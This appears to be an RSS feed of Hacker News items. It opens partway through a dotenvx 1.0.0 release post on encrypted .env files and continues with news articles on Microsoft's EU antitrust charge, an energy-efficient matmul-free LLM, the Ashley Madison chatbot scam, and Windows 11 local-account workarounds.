  <li><em>juggling multiple environments</em></li>
  <li><em>inconsistency across platforms</em></li>
</ol>

<p>All three pose risks to security, and the first does SIGNIFICANTLY.</p>

<p><strong>But I think we have a solution to all three today - with <a href="https://github.com/dotenvx/dotenvx">dotenvx</a></strong>. In reverse problem order:</p>

<ul>
  <li>
<a href="https://github.com/dotenvx/dotenvx?tab=readme-ov-file#run-anywhere">Run Anywhere</a> -&gt; <em>inconsistency across platforms</em>
</li>
  <li>
<a href="https://github.com/dotenvx/dotenvx?tab=readme-ov-file#multiple-environments">Multiple Environments</a> -&gt; <em>juggling multiple environments</em>
</li>
  <li>
<a href="https://github.com/dotenvx/dotenvx?tab=readme-ov-file#encryption">Encryption</a> -&gt; <em>leaking your .env file</em>
</li>
</ul>

<p>Let’s dig into each. I’ll do my best to show rather than tell.</p>

<h2 id="run-anywhere">Run Anywhere</h2>

<p><a href="https://github.com/dotenvx/dotenvx">dotenvx</a> works the same across every language, framework, and platform – inject your env at runtime with <code>dotenvx run -- your-cmd</code>.</p>

<pre><code>$ echo "HELLO=World" &gt; .env
$ echo "console.log('Hello ' + process.env.HELLO)" &gt; index.js

$ node index.js
Hello undefined # without dotenvx

$ dotenvx run -- node index.js
Hello World # with dotenvx
&gt; :-D
</code></pre>

<p>The <a href="https://github.com/dotenvx/dotenvx/blob/6f5a91370437716c93ead3e4400d1ee46e2b77ef/src/lib/helpers/parseDecryptEvalExpand.js#L6">.env parsing engine</a>, <a href="https://github.com/dotenvx/dotenvx?tab=readme-ov-file#run-anywhere">variable expansion</a>, <a href="https://github.com/dotenvx/dotenvx?tab=readme-ov-file#run-anywhere">command substitution</a>, and more work exactly the same. Install dotenvx via <a href="https://dotenvx.com/docs/install#npm">npm</a>, <a href="https://dotenvx.com/docs/install#brew">brew</a>, <a href="https://dotenvx.com/docs/install#shell">curl</a>, <a href="https://dotenvx.com/docs/install#docker">docker</a>, <a href="https://docs/install#windows">windows</a>, and <a href="https://dotenvx.com/docs/install">more</a>.</p>

<p>This solves the problem of <em>inconsistency across platforms</em>. ✅ You’ll get the exact same behavior for your <a href="https://dotenvx.com/docs/guides#python">python apps</a> as your <a href="https://dotenvx.com/docs/guides#node-js">node apps</a> as your <a href="https://dotenvx.com/docs/guides#go">rust apps</a>.</p>

<p><a href="https://github.com/dotenvx/dotenvx?tab=readme-ov-file#run-anywhere"><img src="https://github.com/dotenvx/dotenvx/assets/3848/6a43eb52-4b1d-48c2-8c7a-b62cb35b526b" loading="lazy"></a></p>

<h2 id="multiple-environments">Multiple Environments</h2>

<p>Create a <code>.env.production</code> file and use <code>-f</code> to load it. It’s straightforward, yet flexible.</p>

<pre><code>$ echo "HELLO=production" &gt; .env.production
$ echo "console.log('Hello ' + process.env.HELLO)" &gt; index.js

$ dotenvx run -f .env.production -- node index.js
[dotenvx][info] loading env (1) from .env.production
Hello production
&gt; ^^
</code></pre>

<p>While everything in <a href="https://github.com/dotenvx/dotenvx">dotenvx</a> is inspired by community suggestions, this multi-environment feature particularly is. There were suggestions many times for something similar before I came to understand its usefulness. I’m convinvced now it cleanly solves the problem of <em>juggling multiple environments</em> when built into the command line. ✅</p>

<p>You can even compose multiple environments together with multiple <code>-f</code> flags.</p>

<pre><code>$ echo "HELLO=local" &gt; .env.local
$ echo "HELLO=World" &gt; .env
$ echo "console.log('Hello ' + process.env.HELLO)" &gt; index.js

$ dotenvx run -f .env.local -f .env -- node index.js
[dotenvx] injecting env (1) from .env.local, .env
Hello local
</code></pre>

<p><a href="https://github.com/dotenvx/dotenvx?tab=readme-ov-file#multiple-environments"><img src="https://github.com/dotenvx/dotenvx/assets/3848/8983a359-32f9-459a-861c-66bfdf4e87a1" loading="lazy"></a></p>

<p>Handy! But it’s the next feature, <strong>encryption</strong>, that is the real game changer (and I think merits dotenvx as the <em>next generation of configuration management</em>).</p>

<h2 id="encryption">Encryption</h2>

<p>Add encryption to your .env files with a single command. Run <code>dotenvx encrypt</code>.</p>

<pre><code>$ dotenvx encrypt
✔ encrypted (.env)
</code></pre>

<pre><code>#/-------------------[DOTENV_PUBLIC_KEY]--------------------/
#/            public-key encryption for .env files          /
#/       [how it works](https://dotenvx.com/encryption)     /
#/----------------------------------------------------------/
DOTENV_PUBLIC_KEY="03f8b376234c4f2f0445f392a12e80f3a84b4b0d1e0c3df85c494e45812653c22a"

# Database configuration
DB_HOST="encrypted:BNr24F4vW9CQ37LOXeRgOL6QlwtJfAoAVXtSdSfpicPDHtqo/Q2HekeCjAWrhxHy+VHAB3QTg4fk9VdIoncLIlu1NssFO6XQXN5fnIjXRmp5pAuw7xwqVXe/1lVukATjG0kXR4SHe45s4Tb6fEjs"
DB_PORT="encrypted:BOCHQLIOzrq42WE5zf431xIlLk4iRDn1/hjYBg5kkYLQnL9wV2zEsSyHKBfH3mQdv8w4+EhXiF4unXZi1nYqdjVp4/BbAr777ORjMzyE+3QN1ik1F2+W5DZHBF9Uwj69F4D7f8A="
DB_USER="encrypted:BP6jIRlnYo5LM6/n8GnOAeg4RJlPD6ZN/HkdMdWfgfbQBuZlo44idYzKApdy0znU3TSoF5rcppXIMkxFFuB6pS0U4HMG/jl46lPCswl3vLTQ7Gx5EMT6YwE6pfA88AM77/ebQZ6y0L5t"
DB_PASSWORD="encrypted:BMycwcycXFFJQHjbt1i1IBS7C31Fo73wFzPolFWwkla09SWGy3QU1rBvK0YwdQmbuJuztp9JhcNLuc0wUdlLZVHC4/E6q/K7oPULNPxC5K1LwW4YuX80Ngl6Oy13Twero864f2DXXTNb"
DB_NAME="encrypted:BGtVHZBbvHmX6J+J+xm+73SnUFpqd2AWOL6/mHe1SCqPgMAXqk8dbLgqmHiZSbw4D6VquaYtF9safGyucClAvGGMzgD7gdnXGB1YGGaPN7nTpJ4vE1nx8hi1bNtNCr5gEm7z+pdLq1IsH4vPSH4O7XBx"

# API Keys
API_KEY="encrypted:BD9paBaun2284WcqdFQZUlDKapPiuE/ruoLY7rINtQPXKWcfqI08vFAlCCmwBoJIvd2Nv3ACiSCA672wsKeJlFJTcRB6IRRJ+fPBuz2kvYlOiec7EzHTT8EVzSDydFun5R5ODfmN"
STRIPE_API_KEY="encrypted:BM6udWmFsPaBzlND0dFBv7R55JiaA+cZnbun8DaVNrEvO+8/k+lsXbZQ0bCPks8kUsdD2qrSp/tii0P8gVJ/gp+pdDuhdcJj91hxJ7nzSFf6h0ofRb38/2WHFhxg77XExxzui1s3w42Z"

# Logging
LOG_LEVEL="encrypted:BKmgv5E7/l1FnSaGWYWBPxxagdgN+KSEaB+va3PePjwEp7CqW6PlysrweZq49YTB5Fbc3UN/akLVn1RZ2AO4PyTVqgYYGBwerjpJiou9R2KluNV3T4j0bhsAkBochg3YpHcw3RX/"
</code></pre>

<p>A <code>DOTENV_PUBLIC_KEY</code> (encryption key) and a <code>DOTENV_PRIVATE_KEY</code> (decryption key) are generated using the same public-key cryptography as <a href="https://en.bitcoin.it/wiki/Secp256k1">Bitcoin</a>.</p>

<p>Now, even if you leak your .env file, it’s ok. An attacker needs the <code>DOTENV_PRIVATE_KEY</code> to make sense of things. This effectively solves the problem of <em>leaking your .env file</em> ✅.</p>

<p><a href="https://github.com/dotenvx/dotenvx?tab=readme-ov-file#encryption"><img src="https://github.com/dotenvx/dotenvx/assets/3848/42aef834-50d9-4187-93e4-b5230ae1253a" loading="lazy"></a></p>

<p><strong>Bonus:</strong> This approach additionally makes it possible for contributors to add config while simultaneously being unable to decrypt config. I anticipate this will be useful for open source projects where you want to allow for contribution of secrets without decryption of prior secrets.</p>

<h2 id="100-release">1.0.0 Release</h2>

<p>With that, we’re pleased to announce the release of <a href="https://www.npmjs.com/package/@dotenvx/dotenvx">dotenvx version 1.0.0</a> 🎉.</p>

<p>It is the <em>next generation of configuration management</em>, and I’m looking forward to what you do with it. The next decade (like the last) is bright for dotenv! 🌟</p>

<hr>

<p>If you enjoyed this post, please <a href="https://github.com/dotenvx/dotenvx">share dotenvx with friends</a> or <a href="https://github.com/dotenvx/dotenvx">star it on GitHub</a> to help spread the word.</p>

    </div>

  </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Microsoft charged with EU antitrust violations for bundling Teams (206 pts)]]></title>
            <link>https://www.theverge.com/2024/6/25/24185467/microsoft-teams-eu-bundling-antitrust-violations</link>
            <guid>40787842</guid>
            <pubDate>Tue, 25 Jun 2024 12:40:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theverge.com/2024/6/25/24185467/microsoft-teams-eu-bundling-antitrust-violations">https://www.theverge.com/2024/6/25/24185467/microsoft-teams-eu-bundling-antitrust-violations</a>, See on <a href="https://news.ycombinator.com/item?id=40787842">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>EU regulators have charged Microsoft with illegally bundling its Teams chat app with its Office 365 and Microsoft 365 subscriptions. It’s the first time Microsoft has been charged with antitrust violations in the EU for 15 years, following two big cases related to Windows Media Player and Internet Explorer bundling.</p><p>“The European Commission has informed Microsoft of its preliminary view that Microsoft has breached EU antitrust rules by tying its communication and collaboration product Teams to its popular productivity applications included in its suites for businesses Office 365 and Microsoft 365,” says the European Commission in a <a href="https://ec.europa.eu/commission/presscorner/detail/en/ip_24_3446">statement today</a>.</p><p>Microsoft has now been handed a statement of objections, a list of the EU’s concerns over its Teams bundling. The software giant <a href="https://www.theverge.com/2023/8/31/23853517/microsoft-teams-unbundling-europe">unbundled Teams from Office</a> in Europe last year in an attempt to address regulator concerns, and then <a href="https://www.theverge.com/2024/4/1/24117785/microsoft-teams-office-split-eu-regulation-antitrust-investigation">spun off Teams from Office 365</a> as its own separate app globally. The unbundling hasn’t been enough to prevent charges, though.</p><p>“We are concerned that Microsoft may be giving its own communication product Teams an undue advantage over competitors, by tying it to its popular productivity suites for businesses,” says Margrethe Vestager, the head of competition policy in Europe. “If confirmed, Microsoft’s conduct would be illegal under our competition rules. Microsoft now has the opportunity to reply to our concerns.”</p><p>Microsoft says it is working with the EU to find solutions. “Having unbundled Teams and taken initial interoperability steps, we appreciate the additional clarity provided today and will work to find solutions to address the Commission’s remaining concerns,” says Microsoft president Brad Smith in a statement to the <a href="https://www.ft.com/content/eb83bb45-84b3-4c58-9589-684029d23243"><em>Financial Times</em></a>.</p><p>EU lawmakers <a href="https://www.theverge.com/2023/7/27/23797305/microsoft-teams-eu-antitrust-investigation-office-bundling-slack">first opened</a> a Microsoft antitrust investigation into Teams bundling last year, following an anti-competitive complaint filed by Slack in July 2020. <a href="https://www.theverge.com/2020/7/22/21333989/slack-microsoft-eu-competition-complaint-teams-office">Slack’s original complaint</a>&nbsp;alleged that Microsoft had “illegally tied” its Microsoft Teams product to Office and is “force installing it for millions, blocking its removal, and hiding the true cost to enterprise customers.”</p><p>If Microsoft is found guilty of antitrust violations, the firm could face a fine of up to 10 percent of the company’s annual worldwide turnover. The European Commission could also impose remedies to force Microsoft to change its software products, much like it has in the past.</p><p>In 2004 the European Commission ordered Microsoft to offer a version of Windows without Media Player bundled, which resulted in a Windows XP N version available only in EU markets. In 2009 Microsoft was also forced to implement a browser ballot box in its Windows operating system to ensure users were presented with a choice of web browsers, after years of Microsoft bunding Internet Explorer with Windows. Microsoft was then <a href="https://www.theverge.com/2013/3/6/4069126/eu-fines-microsoft-for-windows-7-sp1-browser-ballot">fined $730 million</a>&nbsp;in 2013 for failing to include the browser ballot in Windows 7 SP1.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Researchers run high-performing LLM on the energy needed to power a lightbulb (128 pts)]]></title>
            <link>https://news.ucsc.edu/2024/06/matmul-free-llm.html</link>
            <guid>40787349</guid>
            <pubDate>Tue, 25 Jun 2024 11:51:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://news.ucsc.edu/2024/06/matmul-free-llm.html">https://news.ucsc.edu/2024/06/matmul-free-llm.html</a>, See on <a href="https://news.ycombinator.com/item?id=40787349">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Large language models such as ChaptGPT have proven to be able to produce remarkably intelligent results, but the energy and monetary costs associated with running these massive algorithms is sky high. It costs $700,000 per day in energy costs to run ChatGPT 3.5, according to recent estimates, and leaves behind a massive carbon footprint in the process.</p><p>In a <a href="https://arxiv.org/abs/2406.02528">new preprint paper</a>, researchers from UC Santa Cruz show that it is possible to eliminate the most computationally expensive element of running large language models, called matrix multiplication, while maintaining performance. In getting rid of matrix multiplication and running their algorithm on custom hardware, the researchers found that they could power a billion-parameter-scale language model on just 13 watts, about equal to the energy of powering a lightbulb and more than 50 times more efficient than typical hardware.&nbsp;</p><p>Even with a slimmed-down algorithm and much less energy consumption, the new, open source model achieves the same performance as state-of-the-art models like Meta’s Llama.</p><p>“We got the same performance at way less cost — all we had to do was fundamentally change how neural networks work,” said Jason Eshraghian, an assistant professor of electrical and computer engineering at the Baskin School of Engineering and the paper’s lead author. “Then we took it a step further and built custom hardware.”</p><p><strong>Understanding the cost&nbsp;&nbsp;</strong></p><p>Until now, all modern neural networks, the algorithms that power large language models, have used a technique called matrix multiplication. In large language models, words are represented as numbers that are then organized into matrices. Matrices are multiplied by each other to produce language, performing operations that weigh the importance of particular words or highlight relationships between words in a sentence or sentences in a paragraph. Larger scale language models have trillions of these numbers.&nbsp;</p><p>“Neural networks, in a way, are glorified matrix multiplication machines,” Eshraghian said. “The larger your matrix, the more things your neural network can learn.”&nbsp;</p><p>For the algorithms to be able to multiply matrices together, the matrices need to be stored somewhere, and then fetched when it comes time to compute. This is solved by storing the matrices on hundreds of physically-separated graphics processing units (GPUs), which are specialized circuits designed to quickly carry out computations on very large datasets, designed by the likes of hardware giant Nvidia. To multiply numbers from matrices on different GPUs, data must be moved around, a process which creates most of the neural network’s costs in terms of time and energy.&nbsp;</p><p><strong>Eliminating matrix multiplication&nbsp;</strong></p><p>The researchers came up with a strategy to avoid using matrix multiplication using two main techniques. The first is a method to force all the numbers within the matrices to be ternary, meaning they can take one of three values: negative one, zero, or positive one. This allows the computation to be reduced to summing numbers rather than multiplying.&nbsp;</p><p>From a computer science perspective the two algorithms can be coded the exact same way, but the way Eshraghian’s team’s method works eliminates a ton of cost on the hardware side.&nbsp;</p><p>“From a circuit designer standpoint, you don't need the overhead of multiplication, which carries a whole heap of cost,” Eshraghian said.&nbsp;</p><p>This strategy was inspired by a paper produced by Microsoft that showed it was possible to use ternary numbers in neural networks, but did not go as far as to get rid of matrix multiplication, or open-sourcing their model to the public. To do this, the researchers adjusted the strategy of how the matrices communicate with each other.</p><p>Instead of multiplying every single number in one matrix with every single number in the other matrix, as is typical, the researchers devised a strategy to produce the same mathematical results. In this approach, the matrices are overlaid and only the most important operations are performed.&nbsp;</p><p>“It’s quite light compared to matrix multiplication,” said Rui-Jie Zhu, the paper’s first author and a graduate student in Eshraghian’s group. “We replaced the expensive operation with cheaper operations.”&nbsp;</p><p>Although they reduced the number of operations, the researchers were able to maintain the performance of the neural network by introducing time-based computation in the training of the model. This enables the network to have a “memory” of the important information it processes, enhancing performance. This technique paid off — the researchers compared their model to Meta’s state-of-the-art algorithm called Llama, and were able to achieve the same performance, even at a scale of billions of model parameters.</p><p><strong>Custom chips</strong></p><p>The researchers designed their neural network to operate on GPUs, as they have become ubiquitous in the AI industry, allowing the team’s software to be readily accessible and useful to anyone who might want to use it.</p><p>On standard GPUs, the researchers saw that their neural network achieved about 10 times less memory consumption and operated about 25 percent faster than other models. Reducing the amount of memory needed to run a powerful large language model could provide a path forward to enabling the algorithms to run at full capacity on devices with smaller memory like smartphones.</p><p>Nvidia, the dominant producer of GPUs worldwide, designs their hardware to be highly optimized to perform matrix multiplication, which has enabled them to dominate the industry and launched them to be one of the most profitable companies in the world. However, this hardware is not fully optimized for ternary operations.</p><p>To push the energy savings even further, the team collaborated with Assistant Professor Dustin Richmond and Lecturer Ethan Sifferman in the Baskin Engineering Computer Science and Engineering department to create custom hardware. Over three weeks, the team created a prototype of their hardware on a highly-customizable circuit called a field-programmable gate array (FPGA). This hardware enables them to take full advantage of all the energy-saving features they programmed into the neural network.</p><p>With this custom hardware, the model surpasses human-readable throughput, meaning it produces words faster than the rate a human reads, on just 13 watts of power. Using GPUs would require about 700 watts of power, meaning that the custom hardware achieved more than 50 times the efficiency of GPUs.&nbsp;</p><p>With further development, the researchers believe they can further optimize the technology for even more energy efficiency.</p><p>“These numbers are already really solid, but it is very easy to make them much better,” Eshraghian said. “If we’re able to do this within 13 watts, just imagine what we could do with a whole data center worth of compute power. We’ve got all these resources, but let’s use them effectively.”</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How GCC and Clang handle statically known undefined behaviour (104 pts)]]></title>
            <link>https://diekmann.uk/blog/2024-06-25-statically-known-undefined-behaviour.html</link>
            <guid>40787276</guid>
            <pubDate>Tue, 25 Jun 2024 11:44:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://diekmann.uk/blog/2024-06-25-statically-known-undefined-behaviour.html">https://diekmann.uk/blog/2024-06-25-statically-known-undefined-behaviour.html</a>, See on <a href="https://news.ycombinator.com/item?id=40787276">Hacker News</a></p>
Couldn't get https://diekmann.uk/blog/2024-06-25-statically-known-undefined-behaviour.html: Error: connect EHOSTUNREACH 2a04:52c0:108:fb61::1:443]]></description>
        </item>
        <item>
            <title><![CDATA[What everyone gets wrong about the 2015 Ashley Madison scandal (124 pts)]]></title>
            <link>https://www.newscientist.com/article/mg26234952-100-what-everyone-gets-wrong-about-the-2015-ashley-madison-scandal/</link>
            <guid>40786891</guid>
            <pubDate>Tue, 25 Jun 2024 11:01:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.newscientist.com/article/mg26234952-100-what-everyone-gets-wrong-about-the-2015-ashley-madison-scandal/">https://www.newscientist.com/article/mg26234952-100-what-everyone-gets-wrong-about-the-2015-ashley-madison-scandal/</a>, See on <a href="https://news.ycombinator.com/item?id=40786891">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
                    <figure><p><img width="1350" height="900" alt="EM8P22 AshleyMadison.com, the dating site for primarily married people, is seen on Wednesday, April 15, 2015. Avid Life Media, the parent company of Ashley Madison, announced that it will be pursuing a initial public offering in London this year hoping to raise $200 million. (? Richard B. Levine)" src="https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg" data-src="https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg" sizes="(min-width: 1288px) 837px, (min-width: 1024px) calc(57.5vw + 55px), (min-width: 415px) calc(100vw - 40px), calc(70vw + 74px)" srcset="https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=300 300w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=400 400w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=500 500w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=600 600w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=700 700w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=800 800w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=837 837w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=900 900w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=1003 1003w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=1100 1100w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=1200 1200w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=1300 1300w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=1400 1400w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=1500 1500w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=1600 1600w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=1674 1674w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=1700 1700w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=1800 1800w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=1900 1900w, https://images.newscientist.com/wp-content/uploads/2024/06/11123716/SEI_207485713.jpg?width=2006 2006w" loading="eager" fetchpriority="high" data-image-context="Article" data-image-id="2435118" data-caption="" data-credit="Richard Levine/Alamy"></p><figcaption><p>Richard Levine/Alamy</p></figcaption></figure>
<p>It has been nearly a decade since hackers dumped huge amounts of personal data from Ashley Madison, the infamous dating site which, back in 2015, catered mostly to men who wanted to cheat on their wives. Now, that story is back in the media, partly because of a recent <a href="https://www.netflix.com/gb/title/81602884">Netflix</a> documentary about it.</p>
<p>You can see me in that series, a nerdy talking head in clips from various TV news shows from 2015, because I was one of the journalists breaking the story. But neither the Netflix series nor the handful of other documentaries still in the works get at what was truly revolutionary – and chilling – about the Ashley Madison affair.</p>
<p>Generally, the media has focused on the (mainly) men whose names and desires were taken from the company’s subscriber database and shared with the world. But that isn’t a new story. People have been trying to have affairs with strangers for thousands of years. Ashley Madison was never really about that. Avid Life Media, its parent company, wasn’t in the business of sex, it was in the <a href="https://www.reuters.com/article/us-ashleymadison-cyber-idUSKCN0ZL09J/">business</a> of bots. Its site became a prototype for what social media platforms such as Facebook are becoming: places so packed with AI-generated nonsense that they feel like spam cages, or information prisons where the only messages that get through are auto-generated ads.</p>
<span></span><p>After a rebrand, Ashley Madison is now owned by Ruby Life and bills itself as a spicy dating site for married people. But back then, it marketed itself as a social networking site for men seeking affairs with women. In late 2015, a group calling itself Impact Team got angry at the site and hacked into its servers. The group grabbed a bunch of user data and code, then posted it on Reddit with the claim that 95 per cent of the people on the site were men. I was intrigued. How could all those men be having affairs, if there were virtually no women on the site?</p>
<p>With the help of two hackers and a database expert, I decided to find out. What I <a href="https://gizmodo.com/ashley-madison-code-shows-more-women-and-more-bots-1727613924">discovered</a> was a bizarre scam – though it was far more like <i>Westworld</i> than US reality show <i>Cheaters</i>. The company had systematically created an army of fake women, mostly very simple chatbots called engagers, who would flirt with men to lure them into paying for a subscription to the site. As I <a href="https://gizmodo.com/almost-none-of-the-women-in-the-ashley-madison-database-1725558944">wrote</a> in 2015, “it’s like a science fictional future where every woman on Earth is dead, and some Dilbert-like engineer has replaced them with badly-designed robots”. Back then, I repeatedly contacted Avid Life Media for comment, but it wouldn’t reply.</p>
<p>As we pored over the code, we found that, although there were a few human women on the site, more than 11 million interactions logged in the database were between human men and female bots. And the men had to pay for every single message they sent. For most of their millions of users, Ashley Madison affairs were entirely a fantasy built out of threadbare chatbot pick-up lines like “how r u?” or “whats up?”</p>
<p>There were real women behind the curtain, though. We found company emails in the data dump and discovered that Avid Life Media was also <a href="https://gizmodo.com/ashley-madison-code-shows-more-women-and-more-bots-1727613924#_ga=1.211307349.1523925811.1419643295">paying</a> a small number of workers to generate fake profiles for more than 70,000 engager bots.</p>
<p>One of these workers <a href="https://www.theglobeandmail.com/news/national/ex-employees-lawsuit-over-wrist-injury-frivolous-dating-website-for-cheaters-says/article15380399/">sued</a> the company in 2013, arguing that she had been required to type up so many fake profiles that she permanently injured her wrists (the lawsuit was dropped in 2015). It gets weirder: we found an internal email where employees discussed a <a href="https://gizmodo.com/how-ashley-madison-hid-its-fembot-con-from-users-and-in-1728410265">tool</a> they had built called fraud-to-engager, which automatically converted fraudulent profiles from other Avid Life Media sites into Ashley Madison bot profiles. “Should tweak it and rename it,” one employee suggested.</p>
<p>At the time, I was shocked by the sheer number of fake women. I <a href="https://gizmodo.com/the-fembots-of-ashley-madison-1726670394">wrote</a>: “Instead of looking at Ashley Madison as a dating site, I think it’s more accurate to call it an anti-community—a hugely popular social site where it’s impossible to be social, because the men can’t talk to each other, most of the women are fake, and the only interaction available is with credit card payments.”</p>
<p>Nine years later, this could describe any number of social media sites that have become swamped with bots and AI-generated absurdity – and charge you for the privilege of interacting with techno-phantoms. Currently, Facebook is trying to figure out how to deal with millions of fake images generated by AI, while Google’s AI bot Overviews is telling users to <a href="https://www.newscientist.com/article/2433133-can-google-fix-its-disastrous-new-ai-search-tool/">glue cheese to pizza</a>. The problem is, human beings are interacting with these AI images and suggestions, in some cases imagining they are engaging with real people.</p>
<p>It is like the whole world has become the Ashley Madison of 2015, and the more we want to talk to each other about it, the less likely we are to find a human to talk to.</p>
<h3>Annalee’s week</h3>
<p><b>What I’m reading</b></p>
<p><i>Renée DiResta’s</i> Invisible Rulers, <i>a brilliantly researched book about online disinformation.</i></p>
<p><b>What I’m listening to</b></p>
<p><i>404 Media’s weekly news podcast, showcasing investigations into the hidden depths of the online world.</i></p>
<p><b>What I’m working on</b></p>
<p><i>Eating biang biang noodles as much as possible on my book tour.</i></p>
<p><em>Annalee Newitz is a science journalist and author. Their latest book is Stories Are Weapons: Psychological warfare and the American mind. They are the co-host of the Hugo-winning podcast Our Opinions Are Correct. You can follow them @annaleen and their website is techsploitation.com</em></p>

                    <section><p>Topics:</p></section>                </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Microsoft removes documentation for switching to a local account in Windows 11 (553 pts)]]></title>
            <link>https://arstechnica.com/gadgets/2024/06/microsoft-removes-documentation-for-switching-to-a-local-account-in-windows-11/</link>
            <guid>40786644</guid>
            <pubDate>Tue, 25 Jun 2024 10:22:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/gadgets/2024/06/microsoft-removes-documentation-for-switching-to-a-local-account-in-windows-11/">https://arstechnica.com/gadgets/2024/06/microsoft-removes-documentation-for-switching-to-a-local-account-in-windows-11/</a>, See on <a href="https://news.ycombinator.com/item?id=40786644">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <h4>
      you're *sure* you don't want to use a Microsoft account??     —
</h4>
            
            <h2 itemprop="description">But most Microsoft account sign-in workarounds for Windows 11 continue to work.</h2>
                    </div><div itemprop="articleBody">
                                    
<figure>
  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/02/win11-pc-2023-800x450.jpeg" alt="A laptop PC running Windows 11 sitting next to a coffee mug.">
      <figcaption><p><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/02/win11-pc-2023.jpeg" data-height="1080" data-width="1920">Enlarge</a> <span>/</span> A PC running Windows 11.</p><p>Microsoft</p></figcaption>  </figure>

  




<!-- cache hit 35:single/related:f82fd1a01b1403f1c7abf95e50c2a8d9 --><!-- empty -->
<p>One of Windows 11's more contentious changes is that, by default, both the Home and Pro editions of the operating system require users to sign in with a Microsoft account during setup. Signing in with an account does get you some benefits, at least if you're a regular user of other Microsoft products like OneDrive, GamePass, or Microsoft 365 (<a href="https://arstechnica.com/gadgets/2022/10/rip-to-microsoft-office-henceforth-to-be-known-as-microsoft-365/">aka Office</a>). But if you don't use those services, a lot of what a Microsoft account gets you in Windows 11 is <a href="https://arstechnica.com/gadgets/2023/08/windows-11-has-made-the-clean-windows-install-an-oxymoron/">repeated ads and reminders</a> about signing up for those services. Using Windows with a traditional local account is still extremely possible, but it does require a small amount of know-how beyond just clicking the right buttons.</p>

<p>On the know-how front, Microsoft has taken one more minor, but nevertheless irritating, step away from allowing users to sign in with local accounts. This <a href="https://support.microsoft.com/en-us/windows/change-from-a-local-account-to-a-microsoft-account-395203bf-9f1b-eb24-b042-5b8dae6c1d20">official Microsoft support page</a> walks users with local accounts through the process of signing in to a Microsoft account. <a href="https://web.archive.org/web/20240612104753/https:/support.microsoft.com/en-us/windows/change-from-a-local-account-to-a-microsoft-account-395203bf-9f1b-eb24-b042-5b8dae6c1d20">As recently as June 12</a>, that page also included instructions for converting a Microsoft account into a local account. But according to Tom's Hardware and the Internet Wayback Machine, those instructions <a href="https://web.archive.org/web/20240617103839/https:/support.microsoft.com/en-us/windows/change-from-a-local-account-to-a-microsoft-account-395203bf-9f1b-eb24-b042-5b8dae6c1d20">disappeared on or around June 17</a> and haven't been seen since.</p>
<p>Despite the documentation change, <a href="https://arstechnica.com/gadgets/2024/02/what-i-do-to-clean-up-a-clean-install-of-windows-11-23h2-and-edge/">most of the workarounds</a> for creating a local account still work in both Windows 11 23H2 (the publicly available version of Windows 11 for most PCs) and 24H2 (<a href="https://arstechnica.com/gadgets/2024/06/windows-11-24h2-is-released-to-the-public-but-only-on-copilot-pcs-for-now/">available now on Copilot+ PCs</a>, later this fall for everyone else). The easiest way to do it on a PC you just took out of the box is to press Shift+F10 during the setup process to bring up a command prompt window, typing <code>OOBE\BYPASSNRO</code>, rebooting, and then clicking the "I don't have Internet" button when asked to connect to a Wi-Fi network.</p>                                            
                                                        
<p>Other workarounds include using the Rufus tool to create a USB installer that will automatically bypass the Microsoft account sign-in requirement, or (for Windows 11 Pro users) indicating that you want to join the PC to a corporate domain and then not actually joining it to a domain. Setting the PC up with a Microsoft account and then signing out afterward is also still an option.</p>
<p>There is one workaround that has allegedly stopped working—it used to be that trying to "sign in" with a nonexistent email account would get you a local sign-in option. But as of earlier this month, <a href="https://x.com/zacbowden/status/1797496910737252744">according to Windows Central editor Zac Bowden</a>, it looks like the Windows 11 setup screen will just ask you to try another email address instead.</p>
<p>To be fair to Microsoft, all the big tech companies want you to sign in with an account before you can use all the features of the software, but neither Apple nor Google goes as far as to <em>mandate</em> account sign-in to access basic functionality. Macs, iPhones, and iPads will all let you complete the setup process without signing in, though you do have to know which buttons to click. Google will allow you to use Chromebooks in guest mode, and Android phones and tablets are still usable without signing in (though this does make it more difficult to find and install apps). Microsoft's pushiness remains unique; there's definitely a difference between a company that would&nbsp;<em>really</em> prefer that you sign in and one that forces you to.</p>

